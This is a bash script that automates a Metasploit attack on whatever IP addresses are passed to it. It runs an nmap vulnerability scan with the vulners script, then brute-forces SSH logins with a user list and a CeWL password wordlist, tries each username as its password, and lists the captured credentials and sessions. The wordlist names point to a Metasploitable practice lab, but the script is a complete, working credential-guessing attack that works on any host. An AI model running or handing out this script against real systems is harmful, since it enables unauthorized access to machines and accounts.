#!/bin/bash
ipaddresses=("$@")

if [[ -z "$@" ]]; then
	echo "You need to enter at least one IP address for your target machine(s)."
	exit 1
fi


echo "${#ipaddresses[@]}"

msfconsole -q -x "workspace -a pentesting_2; \
	db_nmap -A --script=vulners $(echo "${ipaddresses[@]}"); \
	use auxiliary/scanner/ssh/ssh_login; \
       	set RHOSTS $(echo "${ipaddresses[@]}"); \
       	set BRUTEFORCE_SPEED 1; \
       	set USER_FILE metasploitable_users.txt; \
       	set PASS_FILE metasploitable_cewl_wordlist_2.txt; \
	set STOP_ON_SUCCESS true; \
	set THREADS $(echo "${#ipaddresses[@]}"); \
	set USER_AS_PASS true; \
	set VERBOSE true; \
	run; \
	back; \
	hosts; \
	creds; \
	sessions"
